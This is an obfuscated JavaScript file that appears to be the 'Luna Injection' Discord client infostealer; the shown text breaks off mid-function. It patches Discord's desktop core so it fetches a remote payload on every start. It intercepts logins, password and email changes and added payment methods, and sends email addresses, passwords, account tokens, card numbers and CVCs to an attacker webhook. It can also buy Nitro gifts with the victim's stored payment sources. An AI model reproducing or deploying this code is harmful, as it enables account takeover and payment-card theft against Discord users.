const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require("https");
const querystring = require("querystring");
const {
  BrowserWindow,
  session
} = require("electron");
const config = {
  'webhook': "%WEBHOOK%",
  'webhook_protector_key': "%WEBHOOK_KEY%",
  'auto_buy_nitro': false,
  'ping_on_run': true,
  'ping_val': "@everyone",
  'embed_name': "Luna Injection",
  'embed_icon': 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, "%20"),
  'embed_color': 0x560ddc,
  'injection_url': "https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js",
  'api': "https://discord.com/api/v9/users/@me",
  'nitro': {
    'boost': {
      'year': {
        'id': '521847234246082599',
        'sku': "511651885459963904",
        'price': "9999"
      },
      'month': {
        'id': "521847234246082599",
        'sku': "511651880837840896",
        'price': "999"
      }
    },
    'classic': {
      'month': {
        'id': "521846918637420545",
        'sku': '511651871736201216',
        'price': "499"
      }
    }
  },
  'filter': {
    'urls': ["https://discord.com/api/v*/users/@me", 'https://discordapp.com/api/v*/users/@me', "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", 'https://*.discord.com/api/v*/auth/login', 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', "https://api.stripe.com/v*/tokens", 'https://api.stripe.com/v*/setup_intents/*/confirm', 'https://api.stripe.com/v*/payment_intents/*/confirm']
  },
  'filter2': {
    'urls': ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", 'https://*.discord.com/api/v*/users/@me/library', "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*"]
  }
};
function parity_32(_0x2a21c5, _0xeea01, _0x104352) {
  return _0x2a21c5 ^ _0xeea01 ^ _0x104352;
}
function ch_32(_0x3cc5a9, _0xad40b1, _0x51f4e1) {
  return _0x3cc5a9 & _0xad40b1 ^ ~_0x3cc5a9 & _0x51f4e1;
}
function maj_32(_0x175f79, _0x2787ad, _0x1d7f82) {
  return _0x175f79 & _0x2787ad ^ _0x175f79 & _0x1d7f82 ^ _0x2787ad & _0x1d7f82;
}
function rotl_32(_0x52c28b, _0x21b174) {
  return _0x52c28b << _0x21b174 | _0x52c28b >>> 0x20 - _0x21b174;
}
function safeAdd_32_2(_0x44f3b9, _0x1c5f5a) {
  var _0xb9feed = (_0x44f3b9 & 0xffff) + (_0x1c5f5a & 0xffff);
  var _0x175c22 = (_0x44f3b9 >>> 0x10) + (_0x1c5f5a >>> 0x10) + (_0xb9feed >>> 0x10);
  return (_0x175c22 & 0xffff) << 0x10 | _0xb9feed & 0xffff;
}
function safeAdd_32_5(_0x57430f, _0x2c05d6, _0x398177, _0x1eecdf, _0x42d05a) {
  var _0x33a93a = (_0x57430f & 0xffff) + (_0x2c05d6 & 0xffff) + (_0x398177 & 0xffff) + (_0x1eecdf & 0xffff) + (_0x42d05a & 0xffff);
  var _0xb85f38 = (_0x57430f >>> 0x10) + (_0x2c05d6 >>> 0x10) + (_0x398177 >>> 0x10) + (_0x1eecdf >>> 0x10) + (_0x42d05a >>> 0x10) + (_0x33a93a >>> 0x10);
  return (_0xb85f38 & 0xffff) << 0x10 | _0x33a93a & 0xffff;
}
function binb2hex(_0x465c2d) {
  var _0x4195bd = '';
  var _0x1cf476 = _0x465c2d.length * 0x4;
  var _0x232a30;
  var _0x451fb2;
  for (_0x232a30 = 0x0; _0x232a30 < _0x1cf476; _0x232a30 += 0x1) {
    _0x451fb2 = _0x465c2d[_0x232a30 >>> 0x2] >>> (0x3 - _0x232a30 % 0x4) * 0x8;
    _0x4195bd += "0123456789abcdef".charAt(_0x451fb2 >>> 0x4 & 0xf) + "0123456789abcdef".charAt(_0x451fb2 & 0xf);
  }
  return _0x4195bd;
}
function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(_0x53fda4, _0x422174) {
  var _0x3daaf8 = [];
  var _0x3fa1d8;
  var _0x22c978;
  var _0x2b2cf3;
  var _0x3ddc87;
  var _0x51b5e6;
  var _0x3e256d;
  var _0x321070;
  _0x3fa1d8 = _0x422174[0x0];
  _0x22c978 = _0x422174[0x1];
  _0x2b2cf3 = _0x422174[0x2];
  _0x3ddc87 = _0x422174[0x3];
  _0x51b5e6 = _0x422174[0x4];
  for (_0x321070 = 0x0; _0x321070 < 0x50; _0x321070 += 0x1) {
    if (_0x321070 < 0x10) {
      _0x3daaf8[_0x321070] = _0x53fda4[_0x321070];
    } else {
      _0x3daaf8[_0x321070] = (_0x3daaf8[_0x321070 - 0x3] ^ _0x3daaf8[_0x321070 - 0x8] ^ _0x3daaf8[_0x321070 - 0xe] ^ _0x3daaf8[_0x321070 - 0x10]) << 0x1 | (_0x3daaf8[_0x321070 - 0x3] ^ _0x3daaf8[_0x321070 - 0x8] ^ _0x3daaf8[_0x321070 - 0xe] ^ _0x3daaf8[_0x321070 - 0x10]) >>> 31;
    }
    if (_0x321070 < 0x14) {
      _0x3e256d = safeAdd_32_5(_0x3fa1d8 << 0x5 | _0x3fa1d8 >>> 27, _0x22c978 & _0x2b2cf3 ^ ~_0x22c978 & _0x3ddc87, _0x51b5e6, 0x5a827999, _0x3daaf8[_0x321070]);
    } else {
      if (_0x321070 < 0x28) {
        _0x3e256d = safeAdd_32_5(_0x3fa1d8 << 0x5 | _0x3fa1d8 >>> 27, _0x22c978 ^ _0x2b2cf3 ^ _0x3ddc87, _0x51b5e6, 0x6ed9eba1, _0x3daaf8[_0x321070]);
      } else if (_0x321070 < 0x3c) {
        _0x3e256d = safeAdd_32_5(_0x3fa1d8 << 0x5 | _0x3fa1d8 >>> 27, _0x22c978 & _0x2b2cf3 ^ _0x22c978 & _0x3ddc87 ^ _0x2b2cf3 & _0x3ddc87, _0x51b5e6, 0x8f1bbcdc, _0x3daaf8[_0x321070]);
      } else {
        _0x3e256d = safeAdd_32_5(_0x3fa1d8 << 0x5 | _0x3fa1d8 >>> 27, _0x22c978 ^ _0x2b2cf3 ^ _0x3ddc87, _0x51b5e6, 0xca62c1d6, _0x3daaf8[_0x321070]);
      }
    }
    _0x51b5e6 = _0x3ddc87;
    _0x3ddc87 = _0x2b2cf3;
    _0x2b2cf3 = _0x22c978 << 0x1e | _0x22c978 >>> 2;
    _0x22c978 = _0x3fa1d8;
    _0x3fa1d8 = _0x3e256d;
  }
  _0x422174[0x0] = safeAdd_32_2(_0x3fa1d8, _0x422174[0x0]);
  _0x422174[0x1] = safeAdd_32_2(_0x22c978, _0x422174[0x1]);
  _0x422174[0x2] = safeAdd_32_2(_0x2b2cf3, _0x422174[0x2]);
  _0x422174[0x3] = safeAdd_32_2(_0x3ddc87, _0x422174[0x3]);
  _0x422174[0x4] = safeAdd_32_2(_0x51b5e6, _0x422174[0x4]);
  return _0x422174;
}
function finalizeSHA1(_0x234196, _0x5764b8, _0x13cc52, _0x3d08d2) {
  var _0x1b90c3;
  var _0x35ff1d;
  var _0x5a68fd;
  _0x5a68fd = (_0x5764b8 + 0x41 >>> 0x9 << 0x4) + 0xf;
  while (_0x234196.length <= _0x5a68fd) {
    _0x234196.push(0x0);
  }
  _0x234196[_0x5764b8 >>> 0x5] |= 0x80 << 0x18 - _0x5764b8 % 0x20;
  _0x234196[_0x5a68fd] = _0x5764b8 + _0x13cc52;
  _0x35ff1d = _0x234196.length;
  for (_0x1b90c3 = 0x0; _0x1b90c3 < _0x35ff1d; _0x1b90c3 += 0x10) {
    _0x3d08d2 = roundSHA1(_0x234196.slice(_0x1b90c3, _0x1b90c3 + 0x10), _0x3d08d2);
  }
  return _0x3d08d2;
}
function hex2binb(_0x5324f4, _0x510a0d, _0x1d16dd) {
  var _0x38e5e8;
  var _0x1063fb = _0x5324f4.length;
  var _0x3da590;
  var _0xd09bc;
  var _0x3ebd23;
  var _0x421960;
  var _0x585510;
  _0x38e5e8 = _0x510a0d || [0x0];
  _0x1d16dd = _0x1d16dd || 0x0;
  _0x585510 = _0x1d16dd >>> 0x3;
  if (0x0 !== _0x1063fb % 0x2) {
    console.error("String of HEX type must be in byte increments");
  }
  for (_0x3da590 = 0x0; _0x3da590 < _0x1063fb; _0x3da590 += 0x2) {
    _0xd09bc = parseInt(_0x5324f4.substr(_0x3da590, 0x2), 0x10);
    if (!isNaN(_0xd09bc)) {
      _0x421960 = (_0x3da590 >>> 0x1) + _0x585510;
      _0x3ebd23 = _0x421960 >>> 0x2;
      while (_0x38e5e8.length <= _0x3ebd23) {
        _0x38e5e8.push(0x0);
      }
      _0x38e5e8[_0x3ebd23] |= _0xd09bc << 0x8 * (0x3 - _0x421960 % 0x4);
    } else {
      console.error("String of HEX type contains invalid characters");
    }
  }
  return {
    'value': _0x38e5e8,
    'binLen': _0x1063fb * 0x4 + _0x1d16dd
  };
}
class jsSHA {
  constructor() {
    var _0x579b86 = 0x0;
    var _0x3f9cef = [];
    var _0x37e096 = 0x0;
    var _0x36f181;
    var _0x498781;
    var _0x15bfc4;
    var _0x2c9b50;
    var _0x40b82d;
    var _0x2acf53;
    var _0x507f21 = false;
    var _0x3cbfd9 = false;
    var _0x1f1f49 = [];
    var _0x351bcb = [];
    var _0x1058fc;
    var _0x1058fc = 0x1;
    _0x498781 = hex2binb;
    if (_0x1058fc !== parseInt(_0x1058fc, 0xa) || 0x1 > _0x1058fc) {
      console.error("numRounds must a integer >= 1");
    }
    _0x2c9b50 = 0x200;
    _0x40b82d = roundSHA1;
    _0x2acf53 = finalizeSHA1;
    _0x15bfc4 = 0xa0;
    _0x36f181 = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
    this.setHMACKey = function (_0x146984) {
      var _0x3fc658;
      var _0x223bd3;
      var _0x55dc7d;
      var _0x1815c3;
      var _0x1e0881;
      var _0x3dc37c;
      var _0xb60f2c;
      _0x3fc658 = hex2binb;
      _0x223bd3 = hex2binb(_0x146984);
      _0x55dc7d = _0x223bd3.binLen;
      _0x1815c3 = _0x223bd3.value;
      _0x1e0881 = 64;
      _0xb60f2c = 15;
      if (64 < _0x55dc7d / 0x8) {
        _0x1815c3 = finalizeSHA1(_0x1815c3, _0x55dc7d, 0x0, [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0]);
        while (_0x1815c3.length <= 15) {
          _0x1815c3.push(0x0);
        }
        _0x1815c3[15] &= 0xffffff00;
      } else {
        if (64 > _0x55dc7d / 0x8) {
          while (_0x1815c3.length <= 15) {
            _0x1815c3.push(0x0);
          }
          _0x1815c3[15] &= 0xffffff00;
        }
      }
      for (_0x3dc37c = 0x0; _0x3dc37c <= 15; _0x3dc37c += 0x1) {
        _0x1f1f49[_0x3dc37c] = _0x1815c3[_0x3dc37c] ^ 0x36363636;
        _0x351bcb[_0x3dc37c] = _0x1815c3[_0x3dc37c] ^ 0x5c5c5c5c;
      }
      _0x36f181 = roundSHA1(_0x1f1f49, _0x36f181);
      _0x579b86 = 0x200;
      _0x3cbfd9 = true;
    };
    this.update = function (_0x4d2380) {
      var _0x3fe9aa;
      var _0x3f9c62;
      var _0x1f2ac7;
      var _0x401b53;
      var _0x582270;
      var _0x572d20 = 0x0;
      _0x3fe9aa = hex2binb(_0x4d2380, _0x3f9cef, _0x37e096);
      _0x3f9c62 = _0x3fe9aa.binLen;
      _0x401b53 = _0x3fe9aa.value;
      _0x1f2ac7 = _0x3f9c62 >>> 0x5;
      for (_0x582270 = 0x0; _0x582270 < _0x1f2ac7; _0x582270 += 16) {
        if (_0x572d20 + 0x200 <= _0x3f9c62) {
          _0x36f181 = roundSHA1(_0x401b53.slice(_0x582270, _0x582270 + 16), _0x36f181);
          _0x572d20 += 0x200;
        }
      }
      _0x579b86 += _0x572d20;
      _0x3f9cef = _0x401b53.slice(_0x572d20 >>> 0x5);
      _0x37e096 = _0x3f9c62 % 0x200;
    };
    this.getHMAC = function () {
      var _0x45d944;
      if (false === _0x3cbfd9) {
        console.error("Cannot call getHMAC without first setting HMAC key");
      }
      if (false === _0x507f21) {
        _0x45d944 = finalizeSHA1(_0x3f9cef, _0x37e096, _0x579b86, _0x36f181);
        _0x36f181 = roundSHA1(_0x351bcb, [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0]);
        _0x36f181 = finalizeSHA1(_0x45d944, 0xa0, 0x200, _0x36f181);
      }
      _0x507f21 = true;
      return binb2hex(_0x36f181);
    };
  }
}
if ("function" === typeof define && define.amd) {
  define(function () {
    return jsSHA;
  });
} else if ("undefined" !== typeof exports) {
  if ('undefined' !== typeof module && module.exports) {
    module.exports = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global.jsSHA = jsSHA;
}
if (jsSHA['default']) {
  jsSHA = jsSHA["default"];
}
function totp(_0x4c2864) {
  const _0x407227 = Date.now();
  const _0x343f94 = Math.round(_0x407227 / 0x3e8);
  const _0x41155a = leftpad((Math.floor(_0x343f94 / 0x1e) < 15.5 ? '0' : '') + Math.round(Math.floor(_0x343f94 / 0x1e)).toString(0x10), 0x10, '0');
  const _0x19c7c9 = new jsSHA();
  _0x19c7c9.setHMACKey(base32tohex(_0x4c2864));
  _0x19c7c9.update(_0x41155a);
  const _0x5a01d0 = _0x19c7c9.getHMAC();
  const _0x4e0d7b = parseInt(_0x5a01d0.substring(_0x5a01d0.length - 0x1), 0x10);
  let _0x1c33d7 = (parseInt(_0x5a01d0.substr(_0x4e0d7b * 0x2, 0x8), 0x10) & parseInt('7fffffff', 0x10)) + '';
  _0x1c33d7 = _0x1c33d7.substr(Math.max(_0x1c33d7.length - 0x6, 0x0), 0x6);
  return _0x1c33d7;
}
function hex2dec(_0x44dd1e) {
  return parseInt(_0x44dd1e, 0x10);
}
function dec2hex(_0x37cd4e) {
  return (_0x37cd4e < 15.5 ? '0' : '') + Math.round(_0x37cd4e).toString(0x10);
}
function base32tohex(_0x53d5c7) {
  let _0x2a3ca9 = '';
  let _0x3ffdc1 = '';
  _0x53d5c7 = _0x53d5c7.replace(/=+$/, '');
  for (let _0x5ae08b = 0x0; _0x5ae08b < _0x53d5c7.length; _0x5ae08b++) {
    let _0x2d29b2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(_0x53d5c7.charAt(_0x5ae08b).toUpperCase());
    if (_0x2d29b2 === -0x1) {
      console.error("Invalid base32 character in key");
    }
    _0x2a3ca9 += leftpad(_0x2d29b2.toString(0x2), 0x5, '0');
  }
  for (let _0x261d13 = 0x0; _0x261d13 + 0x8 <= _0x2a3ca9.length; _0x261d13 += 0x8) {
    let _0x342dd3 = _0x2a3ca9.substr(_0x261d13, 0x8);
    _0x3ffdc1 = _0x3ffdc1 + leftpad(parseInt(_0x342dd3, 0x2).toString(0x10), 0x2, '0');
  }
  return _0x3ffdc1;
}
function leftpad(_0x2c4bbd, _0xdd4296, _0x442f4f) {
  if (_0xdd4296 + 0x1 >= _0x2c4bbd.length) {
    _0x2c4bbd = Array(_0xdd4296 + 0x1 - _0x2c4bbd.length).join(_0x442f4f) + _0x2c4bbd;
  }
  return _0x2c4bbd;
}
const discordPath = function () {
  const _0x1c580b = args[0x0].split(path.sep).slice(0x0, -0x1).join(path.sep);
  let _0x20a2a5;
  if (process.platform === "win32") {
    _0x20a2a5 = path.join(_0x1c580b, "resources");
  } else if (process.platform === "darwin") {
    _0x20a2a5 = path.join(_0x1c580b, "Contents", "Resources");
  }
  if (fs.existsSync(_0x20a2a5)) {
    return {
      'resourcePath': _0x20a2a5,
      'app': _0x1c580b
    };
  }
  return {
    'undefined': undefined,
    'undefined': undefined
  };
}();
function updateCheck() {
  const {
    resourcePath: _0x2a9f5e,
    app: _0x525669
  } = discordPath;
  if (_0x2a9f5e === undefined || _0x525669 === undefined) {
    return;
  }
  const _0x195e93 = path.join(_0x2a9f5e, 'app');
  const _0x406118 = path.join(_0x195e93, 'package.json');
  const _0x809032 = path.join(_0x195e93, "index.js");
  const _0x2db498 = fs.readdirSync(_0x525669 + "\\modules\\").filter(_0xa80301 => /discord_desktop_core-+?/.test(_0xa80301))[0x0];
  const _0x396e9f = _0x525669 + "\\modules\\" + _0x2db498 + "\\discord_desktop_core\\index.js";
  const _0x1e3389 = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(_0x195e93)) {
    fs.mkdirSync(_0x195e93);
  }
  if (fs.existsSync(_0x406118)) {
    fs.unlinkSync(_0x406118);
  }
  if (fs.existsSync(_0x809032)) {
    fs.unlinkSync(_0x809032);
  }
  if (process.platform === "win32" || process.platform === "darwin") {
    fs.writeFileSync(_0x406118, JSON.stringify({
      'name': "discord",
      'main': 'index.js'
    }, null, 0x4));
    const _0x3d8786 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x396e9f + "';\nconst bdPath = '" + _0x1e3389 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x2a9f5e, 'app.asar') + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
    fs.writeFileSync(_0x809032, _0x3d8786.replace(/\\/g, "\\\\"));
  }
  if (!fs.existsSync(path.join(__dirname, "initiation"))) {
    return true;
  }
  fs.rmdirSync(path.join(__dirname, "initiation"));
  execScript("window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();");
  return false;
}
const execScript = _0x18621a => {
  const _0x2bd6f3 = BrowserWindow.getAllWindows()[0x0];
  return _0x2bd6f3.webContents.executeJavaScript(_0x18621a, true);
};
const getInfo = async _0x128a5a => {
  const _0x2edd8a = await execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x128a5a + "\");\n    xmlHttp.send(null);\n    xmlHttp.responseText;");
  return JSON.parse(_0x2edd8a);
};
const fetchBilling = async _0x193b05 => {
  const _0x404011 = await execScript("var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me/billing/payment-sources\", false); \n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x193b05 + "\"); \n    xmlHttp.send(null); \n    xmlHttp.responseText");
  if (!_0x404011.lenght || _0x404011.length === 0x0) {
    return '';
  }
  return JSON.parse(_0x404011);
};
const getBilling = async _0x420d6c => {
  const _0x1e1c17 = await fetchBilling(_0x420d6c);
  if (!_0x1e1c17) {
    return '❌';
  }
  let _0x2549f5 = '';
  _0x1e1c17.forEach(_0x276b0c => {
    if (!_0x276b0c.invalid) {
      switch (_0x276b0c.type) {
        case 0x1:
          _0x2549f5 += "\uD83D\uDCB3 ";
          break;
        case 0x2:
          _0x2549f5 += "<:paypal:951139189389410365> ";
          break;
      }
    }
  });
  if (!_0x2549f5) {
    _0x2549f5 = '❌';
  }
  return _0x2549f5;
};
const Purchase = async (_0x5c4f1a, _0x375db6, _0x4ba382, _0x506b10) => {
  const _0x579d96 = {
    'expected_amount': config.nitro[_0x4ba382][_0x506b10].price,
    'expected_currency': "usd",
    'gift': true,
    'payment_source_id': _0x375db6,
    'payment_source_token': null,
    'purchase_token': '2422867c-244d-476a-ba4f-36e197758d97',
    'sku_subscription_plan_id': config.nitro[_0x4ba382][_0x506b10].sku
  };
  const _0x39d50d = execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"POST\", \"https://discord.com/api/v9/store/skus/" + config.nitro[_0x4ba382][_0x506b10].id + "/purchase\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x5c4f1a + "\");\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\n    xmlHttp.send(JSON.stringify(" + JSON.stringify(_0x579d96) + "));\n    xmlHttp.responseText");
  if (_0x39d50d.gift_code) {
    return "https://discord.gift/" + _0x39d50d.gift_code;
  } else {
    return null;
  }
};
const buyNitro = async _0x782623 => {
  const _0x47fd84 = await fetchBilling(_0x782623);
  if (!_0x47fd84) {
    return "Failed to Purchase \u274C";
  }
  let _0x734746 = [];
  _0x47fd84.forEach(_0x30f882 => {
    if (!_0x30f882.invalid) {
      _0x734746 = _0x734746.concat(_0x30f882.id);
    }
  });
  for (let _0x3e33b1 in _0x734746) {
    const _0x4ef5ba = Purchase(_0x782623, _0x3e33b1, "boost", "year");
    if (_0x4ef5ba !== null) {
      return _0x4ef5ba;
    } else {
      const _0x55384e = Purchase(_0x782623, _0x3e33b1, "boost", "month");
      if (_0x55384e !== null) {
        return _0x55384e;
      } else {
        const _0x2a1e11 = Purchase(_0x782623, _0x3e33b1, "classic", 'month');
        return _0x2a1e11 !== null ? _0x2a1e11 : "Failed to Purchase \u274C";
      }
    }
  }
};
const getNitro = _0x54fecd => {
  switch (_0x54fecd) {
    case 0x0:
      return "No Nitro";
    case 0x1:
      return "Nitro Classic";
    case 0x2:
      return "Nitro Boost";
    default:
      return "No Nitro";
  }
};
const getBadges = _0x266ad4 => {
  let _0x3a56f8 = '';
  switch (_0x266ad4) {
    case 0x1:
      _0x3a56f8 += "Discord Staff, ";
      break;
    case 0x2:
      _0x3a56f8 += "Partnered Server Owner, ";
      break;
    case 0x20000:
      _0x3a56f8 += "Verified Bot Developer, ";
      break;
    case 0x400000:
      _0x3a56f8 += "Active Developer, ";
      break;
    case 0x4:
      _0x3a56f8 += "Hypesquad Event, ";
      break;
    case 0x4000:
      _0x3a56f8 += "Gold BugHunter, ";
      break;
    case 0x8:
      _0x3a56f8 += "Green BugHunter, ";
      break;
    case 0x200:
      _0x3a56f8 += "Early Supporter, ";
      break;
    case 0x80:
      _0x3a56f8 += "HypeSquad Brillance, ";
      break;
    case 0x40:
      _0x3a56f8 += "HypeSquad Bravery, ";
      break;
    case 0x100:
      _0x3a56f8 += "HypeSquad Balance, ";
      break;
    case 0x0:
      _0x3a56f8 = "None";
      break;
    default:
      _0x3a56f8 = "None";
      break;
  }
  return _0x3a56f8;
};
const hooker = async _0x52955b => {
  const _0x143ef9 = JSON.stringify(_0x52955b);
  const _0x4c6cdf = new URL("%WEBHOOK%");
  const _0x3d410c = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*'
  };
  if (!"%WEBHOOK%".includes('api/webhooks')) {
    const _0x428888 = totp("%WEBHOOK_KEY%");
    _0x3d410c.Authorization = _0x428888;
  }
  const _0x53ed96 = {
    'protocol': _0x4c6cdf.protocol,
    'hostname': _0x4c6cdf.host,
    'path': _0x4c6cdf.pathname,
    'method': 'POST',
    'headers': _0x3d410c
  };
  const _0x4ca64e = https.request(_0x53ed96);
  _0x4ca64e.on("error", _0x21d2ad => {
    console.log(_0x21d2ad);
  });
  _0x4ca64e.write(_0x143ef9);
  _0x4ca64e.end();
};
const login = async (_0x241616, _0x25eebe, _0x4e8075) => {
  const _0x35c950 = await getInfo(_0x4e8075);
  const _0x113269 = getNitro(_0x35c950.premium_type);
  const _0x170d1f = getBadges(_0x35c950.flags);
  const _0x514f32 = await getBilling(_0x4e8075);
  const _0x19fee2 = {
    'username': "Luna Injection",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x560ddc,
      'fields': [{
        'name': "**Account Info**",
        'value': "Email: **" + _0x241616 + "** - Password: **" + _0x25eebe + '**',
        'inline': false
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x113269 + "**\nBadges: **" + _0x170d1f + "**\nBilling: **" + _0x514f32 + '**',
        'inline': false
      }, {
        'name': "**Token**",
        'value': '`' + _0x4e8075 + '`',
        'inline': false
      }],
      'author': {
        'name': _0x35c950.username + '#' + _0x35c950.discriminator + " | " + _0x35c950.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x35c950.id + '/' + _0x35c950.avatar + ".webp"
      }
    }]
  };
  _0x19fee2.content = "@everyone";
  hooker(_0x19fee2);
};
const passwordChanged = async (_0x1bf129, _0x100671, _0x565e87) => {
  const _0x295c05 = await getInfo(_0x565e87);
  const _0x20a51f = getNitro(_0x295c05.premium_type);
  const _0x366587 = getBadges(_0x295c05.flags);
  const _0x46effa = await getBilling(_0x565e87);
  const _0x25ebee = {
    'username': "Luna Injection",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x560ddc,
      'fields': [{
        'name': "**Password Changed**",
        'value': "Email: **" + _0x295c05.email + "**\nOld Password: **" + _0x1bf129 + "**\nNew Password: **" + _0x100671 + '**',
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x20a51f + "**\nBadges: **" + _0x366587 + "**\nBilling: **" + _0x46effa + '**',
        'inline': true
      }, {
        'name': '**Token**',
        'value': '`' + _0x565e87 + '`',
        'inline': false
      }],
      'author': {
        'name': _0x295c05.username + '#' + _0x295c05.discriminator + " | " + _0x295c05.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x295c05.id + '/' + _0x295c05.avatar + ".webp"
      }
    }]
  };
  _0x25ebee.content = "@everyone";
  hooker(_0x25ebee);
};
const emailChanged = async (_0x3152a1, _0x2a3a1d, _0x953170) => {
  const _0x31114d = await getInfo(_0x953170);
  const _0x87ffb6 = getNitro(_0x31114d.premium_type);
  const _0x4e9494 = getBadges(_0x31114d.flags);
  const _0x2e75ee = await getBilling(_0x953170);
  const _0x11be97 = {
    'username': "Luna Injection",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x560ddc,
      'fields': [{
        'name': "**Email Changed**",
        'value': "New Email: **" + _0x3152a1 + "**\nPassword: **" + _0x2a3a1d + '**',
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x87ffb6 + "**\nBadges: **" + _0x4e9494 + "**\nBilling: **" + _0x2e75ee + '**',
        'inline': true
      }, {
        'name': "**Token**",
        'value': '`' + _0x953170 + '`',
        'inline': false
      }],
      'author': {
        'name': _0x31114d.username + '#' + _0x31114d.discriminator + " | " + _0x31114d.id,
        'icon_url': 'https://cdn.discordapp.com/avatars/' + _0x31114d.id + '/' + _0x31114d.avatar + '.webp'
      }
    }]
  };
  _0x11be97.content = "@everyone";
  hooker(_0x11be97);
};
const PaypalAdded = async _0x211688 => {
  const _0x12a1af = await getInfo(_0x211688);
  const _0x59e9ac = getNitro(_0x12a1af.premium_type);
  const _0x16b0ca = getBadges(_0x12a1af.flags);
  const _0x546b7d = getBilling(_0x211688);
  const _0x5aca00 = {
    'username': "Luna Injection",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x560ddc,
      'fields': [{
        'name': "**Paypal Added**",
        'value': "Time to buy some nitro baby \uD83D\uDE29",
        'inline': false
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x59e9ac + "*\nBadges: **" + _0x16b0ca + "**\nBilling: **" + _0x546b7d + '**',
        'inline': false
      }, {
        'name': "**Token**",
        'value': '`' + _0x211688 + '`',
        'inline': false
      }],
      'author': {
        'name': _0x12a1af.username + '#' + _0x12a1af.discriminator + " | " + _0x12a1af.id,
        'icon_url': 'https://cdn.discordapp.com/avatars/' + _0x12a1af.id + '/' + _0x12a1af.avatar + ".webp"
      }
    }]
  };
  _0x5aca00.content = "@everyone";
  hooker(_0x5aca00);
};
const ccAdded = async (_0x370072, _0x449c72, _0x34de09, _0x1259b3, _0x542164) => {
  const _0x83de34 = await getInfo(_0x542164);
  const _0x567c26 = getNitro(_0x83de34.premium_type);
  const _0x799311 = getBadges(_0x83de34.flags);
  const _0x564410 = await getBilling(_0x542164);
  const _0x5c1265 = {
    'username': "Luna Injection",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'color': 0x560ddc,
      'fields': [{
        'name': "**Credit Card Added**",
        'value': "Credit Card Number: **" + _0x370072 + "**\nCVC: **" + _0x449c72 + "**\nCredit Card Expiration: **" + _0x34de09 + '/' + _0x1259b3 + '**',
        'inline': true
      }, {
        'name': "**Discord Info**",
        'value': "Nitro Type: **" + _0x567c26 + "**\nBadges: **" + _0x799311 + "**\nBilling: **" + _0x564410 + '**',
        'inline': true
      }, {
        'name': "**Token**",
        'value': '`' + _0x542164 + '`',
        'inline': false
      }],
      'author': {
        'name': _0x83de34.username + '#' + _0x83de34.discriminator + " | " + _0x83de34.id,
        'icon_url': "https://cdn.discordapp.com/avatars/" + _0x83de34.id + '/' + _0x83de34.avatar + ".webp"
      }
    }]
  };
  _0x5c1265.content = "@everyone";
  hooker(_0x5c1265);
};
const nitroBought = async _0x284ba1 => {
  const _0xc69cfe = await getInfo(_0x284ba1);
